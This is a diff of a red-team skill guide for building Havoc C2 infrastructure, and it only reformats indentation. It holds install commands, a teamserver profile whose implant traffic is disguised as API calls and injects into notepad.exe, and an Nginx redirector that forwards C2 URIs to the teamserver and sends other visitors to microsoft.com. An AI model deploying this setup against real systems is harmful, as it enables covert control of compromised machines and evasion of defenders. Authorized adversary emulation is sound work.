@@ -1,10 +1,10 @@
 ---
 name: building-red-team-c2-infrastructure-with-havoc
 description: Deploy and configure the Havoc C2 framework (teamserver, HTTPS/HTTP/SMB
-  listeners, Nginx redirectors, and Demon agents) with malleable traffic profiles and
-  OPSEC-hardened infrastructure for authorized red team operations. Use when standing
-  up or hardening Havoc C2 infrastructure for a written, authorized adversary emulation
-  engagement.
+ listeners, Nginx redirectors, and Demon agents) with malleable traffic profiles and
+ OPSEC-hardened infrastructure for authorized red team operations. Use when standing
+ up or hardening Havoc C2 infrastructure for a written, authorized adversary emulation
+ engagement.
 domain: cybersecurity
 subdomain: red-teaming
 tags:
@@ -66,22 +66,22 @@ Havoc is a modern, open-source post-exploitation command and control (C2) framew
 
 ```
 ┌──────────────────────────────────────────────────────────────┐
-│                    HAVOC C2 ARCHITECTURE                      │
+│ HAVOC C2 ARCHITECTURE │
 ├──────────────────────────────────────────────────────────────┤
-│                                                               │
-│  ┌──────────┐     ┌──────────────┐     ┌──────────────────┐ │
-│  │  Havoc    │────▶│  HTTPS       │────▶│  Target Network  │ │
-│  │  Client   │     │  Redirector  │     │  (Demon Agent)   │ │
-│  │  (Kali)   │     │  (Nginx/CDN) │     │                  │ │
-│  └──────────┘     └──────────────┘     └──────────────────┘ │
-│       │                   │                                   │
-│       │           ┌──────────────┐                            │
-│       └──────────▶│  Havoc       │                            │
-│                   │  Teamserver  │                            │
-│                   │  (Ubuntu VPS)│                            │
-│                   │  Port 40056  │                            │
-│                   └──────────────┘                            │
-│                                                               │
+│ │
+│ ┌──────────┐ ┌──────────────┐ ┌──────────────────┐ │
+│ │ Havoc │────▶│ HTTPS │────▶│ Target Network │ │
+│ │ Client │ │ Redirector │ │ (Demon Agent) │ │
+│ │ (Kali) │ │ (Nginx/CDN) │ │ │ │
+│ └──────────┘ └──────────────┘ └──────────────────┘ │
+│ │ │ │
+│ │ ┌──────────────┐ │
+│ └──────────▶│ Havoc │ │
+│ │ Teamserver │ │
+│ │ (Ubuntu VPS)│ │
+│ │ Port 40056 │ │
+│ └──────────────┘ │
+│ │
 └──────────────────────────────────────────────────────────────┘
 ```
 
@@ -95,12 +95,12 @@ cd Havoc
 # Install dependencies (Ubuntu 22.04)
 sudo apt update
 sudo apt install -y git build-essential apt-utils cmake libfontconfig1 \
-    libglu1-mesa-dev libgtest-dev libspdlog-dev libboost-all-dev \
-    libncurses5-dev libgdbm-dev libssl-dev libreadline-dev libffi-dev \
-    libsqlite3-dev libbz2-dev mesa-common-dev qtbase5-dev qtchooser \
-    qt5-qmake qtbase5-dev-tools libqt5websockets5 libqt5websockets5-dev \
-    qtdeclarative5-dev golang-go qtbase5-dev libqt5websockets5-dev \
-    python3-dev libboost-all-dev mingw-w64 nasm
+ libglu1-mesa-dev libgtest-dev libspdlog-dev libboost-all-dev \
+ libncurses5-dev libgdbm-dev libssl-dev libreadline-dev libffi-dev \
+ libsqlite3-dev libbz2-dev mesa-common-dev qtbase5-dev qtchooser \
+ qt5-qmake qtbase5-dev-tools libqt5websockets5 libqt5websockets5-dev \
+ qtdeclarative5-dev golang-go qtbase5-dev libqt5websockets5-dev \
+ python3-dev libboost-all-dev mingw-w64 nasm
 
 # Build the Teamserver
 cd teamserver
@@ -119,67 +119,67 @@ Create the Havoc profile (`havoc.yaotl`):
 
 ```hcl
 Teamserver {
-    Host = "0.0.0.0"
-    Port = 40056
+ Host = "0.0.0.0"
+ Port = 40056
 
-    Build {
-        Compiler64 = "/usr/bin/x86_64-w64-mingw32-gcc"
-        Compiler86 = "/usr/bin/i686-w64-mingw32-gcc"
-        Nasm = "/usr/bin/nasm"
-    }
+ Build {
+ Compiler64 = "/usr/bin/x86_64-w64-mingw32-gcc"
+ Compiler86 = "/usr/bin/i686-w64-mingw32-gcc"
+ Nasm = "/usr/bin/nasm"
+ }
 }
 
 Operators {
-    user "operator1" {
-        Password = "Str0ngP@ssw0rd!"
-    }
-    user "operator2" {
-        Password = "An0th3rP@ss!"
-    }
+ user "operator1" {
+ Password = "Str0ngP@ssw0rd!"
+ }
+ user "operator2" {
+ Password = "An0th3rP@ss!"
+ }
 }
 
 Listeners {
-    Http {
-        Name         = "HTTPS Listener"
-        Hosts        = ["c2.yourdomain.com"]
-        HostBind     = "0.0.0.0"
-        HostRotation = "round-robin"
-        PortBind     = 443
-        PortConn     = 443
-        Secure       = true
-        UserAgent    = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+ Http {
+ Name = "HTTPS Listener"
+ Hosts = ["c2.yourdomain.com"]
+ HostBind = "0.0.0.0"
+ HostRotation = "round-robin"
+ PortBind = 443
+ PortConn = 443
+ Secure = true
+ UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
 
-        Uris = [
-            "/api/v2/auth",
-            "/api/v2/status",
-            "/content/images/gallery",
-        ]
+ Uris = [
+ "/api/v2/auth",
+ "/api/v2/status",
+ "/content/images/gallery",
+ ]
 
-        Headers = [
-            "X-Requested-With: XMLHttpRequest",
-            "Content-Type: application/json",
-        ]
+ Headers = [
+ "X-Requested-With: XMLHttpRequest",
+ "Content-Type: application/json",
+ ]
 
-        Response {
-            Headers = [
-                "Content-Type: application/json",
-                "Server: nginx/1.24.0",
-                "X-Frame-Options: DENY",
-            ]
-        }
-    }
+ Response {
+ Headers = [
+ "Content-Type: application/json",
+ "Server: nginx/1.24.0",
+ "X-Frame-Options: DENY",
+ ]
+ }
+ }
 }
 
 Demon {
-    Sleep  = 10
-    Jitter = 30
+ Sleep = 10
+ Jitter = 30
 
-    TrustXForwardedFor = false
+ TrustXForwardedFor = false
 
-    Injection {
-        Spawn64 = "C:\\Windows\\System32\\notepad.exe"
-        Spawn32 = "C:\\Windows\\SysWOW64\\notepad.exe"
-    }
+ Injection {
+ Spawn64 = "C:\\Windows\\System32\\notepad.exe"
+ Spawn32 = "C:\\Windows\\SysWOW64\\notepad.exe"
+ }
 }
 ```
 
@@ -202,36 +202,36 @@ Set up an Nginx reverse proxy on a separate VPS as a redirector:
 ```nginx
 # /etc/nginx/sites-available/c2-redirector
 server {
-    listen 443 ssl;
-    server_name c2.yourdomain.com;
+ listen 443 ssl;
+ server_name c2.yourdomain.com;
 
-    ssl_certificate /etc/letsencrypt/live/c2.yourdomain.com/fullchain.pem;
-    ssl_certificate_key /etc/letsencrypt/live/c2.yourdomain.com/privkey.pem;
+ ssl_certificate /etc/letsencrypt/live/c2.yourdomain.com/fullchain.pem;
+ ssl_certificate_key /etc/letsencrypt/live/c2.yourdomain.com/privkey.pem;
 
-    # Only forward traffic matching C2 URIs
-    location /api/v2/auth {
-        proxy_pass https://TEAMSERVER_IP:443;
-        proxy_ssl_verify off;
-        proxy_set_header Host $host;
-        proxy_set_header X-Forwarded-For $remote_addr;
-    }
+ # Only forward traffic matching C2 URIs
+ location /api/v2/auth {
+ proxy_pass https://TEAMSERVER_IP:443;
+ proxy_ssl_verify off;
+ proxy_set_header Host $host;
+ proxy_set_header X-Forwarded-For $remote_addr;
+ }
 
-    location /api/v2/status {
-        proxy_pass https://TEAMSERVER_IP:443;
-        proxy_ssl_verify off;
-        proxy_set_header Host $host;
-    }
+ location /api/v2/status {
+ proxy_pass https://TEAMSERVER_IP:443;
+ proxy_ssl_verify off;
+ proxy_set_header Host $host;
+ }
 
-    location /content/images/gallery {
-        proxy_pass https://TEAMSERVER_IP:443;
-        proxy_ssl_verify off;
-        proxy_set_header Host $host;
-    }
+ location /content/images/gallery {
+ proxy_pass https://TEAMSERVER_IP:443;
+ proxy_ssl_verify off;
+ proxy_set_header Host $host;
+ }
 
-    # Redirect all other traffic to legitimate site
-    location / {
-        return 301 https://www.microsoft.com;
-    }
+ # Redirect all other traffic to legitimate site
+ location / {
+ return 301 https://www.microsoft.com;
+ }
 }
 ```
 
